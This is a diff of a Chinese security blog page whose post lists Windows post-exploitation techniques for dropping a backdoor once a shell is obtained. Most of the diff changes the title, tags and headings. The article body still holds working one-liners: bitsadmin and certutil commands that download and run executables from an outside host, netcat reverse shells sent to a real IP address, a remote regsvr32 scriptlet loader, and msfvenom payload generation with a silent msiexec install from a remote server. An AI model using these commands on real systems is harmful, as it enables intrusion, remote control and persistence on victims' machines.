@@ -16,12 +16,12 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 序拿到目标shell以后怎么上后门？可以使用下面几种文件下载执行的姿势。 0x02 CobaltStrike 命令上线使用CobaltStrike生成powershell payload  0x03 bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;t">
+    <meta name="description" content="0、简介拿到目标shell可以使用下面几种命令执行的姿势。 1、CobaltStrike 命令上线使用CobaltStrike生成powershell payload  2、bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;x">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Win上马的的几种姿势">
-<meta property="og:url" content="http://example.com/2022/07/21/Win%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%89%A7%E8%A1%8C%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:title" content="Win命令执行的的几种姿势">
+<meta property="og:url" content="http://example.com/2022/07/21/Win%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog">
-<meta property="og:description" content="0x01 序拿到目标shell以后怎么上后门？可以使用下面几种文件下载执行的姿势。 0x02 CobaltStrike 命令上线使用CobaltStrike生成powershell payload  0x03 bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;t">
+<meta property="og:description" content="0、简介拿到目标shell可以使用下面几种命令执行的姿势。 1、CobaltStrike 命令上线使用CobaltStrike生成powershell payload  2、bitsadminbitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。 注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。 1bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;x">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1719815226535-1.png">
@@ -33,9 +33,9 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/msiexec-calc.gif">
 <meta property="article:published_time" content="2022-07-21T07:05:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T10:38:22.389Z">
+<meta property="article:modified_time" content="2024-07-01T12:40:43.221Z">
 <meta property="article:author" content="Ninja">
-<meta property="article:tag" content="上马">
+<meta property="article:tag" content="命令执行">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif">
   
@@ -43,7 +43,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Win上马的的几种姿势 - Ninja&#39;s blog</title>
+  <title>Win命令执行的的几种姿势 - Ninja&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -81,7 +81,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -221,7 +221,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Win上马的的几种姿势"></span>
+            <span id="subtitle" data-typed-text="Win命令执行的的几种姿势"></span>
           
         </div>
 
@@ -244,7 +244,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          437 字
+          435 字
         
       </span>
     
@@ -300,15 +300,15 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Win上马的的几种姿势</h1>
+            <h1 id="seo-header">Win命令执行的的几种姿势</h1>
             
             
               <div class="markdown-body">
                 
-                <h4 id="0x01-序"><a href="#0x01-序" class="headerlink" title="0x01 序"></a>0x01 序</h4><p>拿到目标shell以后怎么上后门？可以使用下面几种文件下载执行的姿势。</p>
-<h4 id="0x02-CobaltStrike-命令上线"><a href="#0x02-CobaltStrike-命令上线" class="headerlink" title="0x02 CobaltStrike 命令上线"></a>0x02 CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p>
+                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>拿到目标shell可以使用下面几种命令执行的姿势。</p>
+<h4 id="1、CobaltStrike-命令上线"><a href="#1、CobaltStrike-命令上线" class="headerlink" title="1、CobaltStrike 命令上线"></a>1、CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p>
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
+<h4 id="2、bitsadmin"><a href="#2、bitsadmin" class="headerlink" title="2、bitsadmin"></a>2、bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p>
 <p>注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure>
 
@@ -318,7 +318,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin-nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="0x04-certutil"><a href="#0x04-certutil" class="headerlink" title="0x04 certutil"></a>0x04 certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p>
+<h4 id="3、certutil"><a href="#3、certutil" class="headerlink" title="3、certutil"></a>3、certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p>
 <p>注：缓存位置</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xx.imortal.icu/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure>
 
@@ -328,11 +328,12 @@
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span> &amp; start nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/nc.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="0x05-regsvr32"><a href="#0x05-regsvr32" class="headerlink" title="0x05 regsvr32"></a>0x05 regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p>
-<h6 id="构造-sct文件执行命令"><a href="#构造-sct文件执行命令" class="headerlink" title="构造.sct文件执行命令"></a>构造.sct文件执行命令</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[            </span></span><br><span class="language-xml"><span class="language-handlebars">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br>regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure>
+<h4 id="4、regsvr32"><a href="#4、regsvr32" class="headerlink" title="4、regsvr32"></a>4、regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p>
+<p><strong>构造.sct文件执行命令</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[            </span></span><br><span class="language-xml"><span class="language-handlebars">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br>regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil1.gif" srcset="/img/loading.gif" lazyload></p>
-<h4 id="0x06-msiexec"><a href="#0x06-msiexec" class="headerlink" title="0x06 msiexec"></a>0x06 msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure>
+<h4 id="5、msiexec"><a href="#5、msiexec" class="headerlink" title="5、msiexec"></a>5、msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://tools.imortal.icu/calc.msi<br></code></pre></td></tr></table></figure>
@@ -371,7 +372,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E4%B8%8A%E9%A9%AC/" class="print-no-link">#上马</a>
+        <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a>
       
     </div>
   
@@ -502,30 +503,6 @@
        <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
     </div>
   
-  
-    <div class="statistics">
-  
-  
-
-  
-    
-      <span id="busuanzi_container_site_pv" style="display: none">
-        总访问量 
-        <span id="busuanzi_value_site_pv"></span>
-         次
-      </span>
-    
-    
-      <span id="busuanzi_container_site_uv" style="display: none">
-        总访客数 
-        <span id="busuanzi_value_site_uv"></span>
-         人
-      </span>
-    
-    
-  
-</div>
-
   
   
   
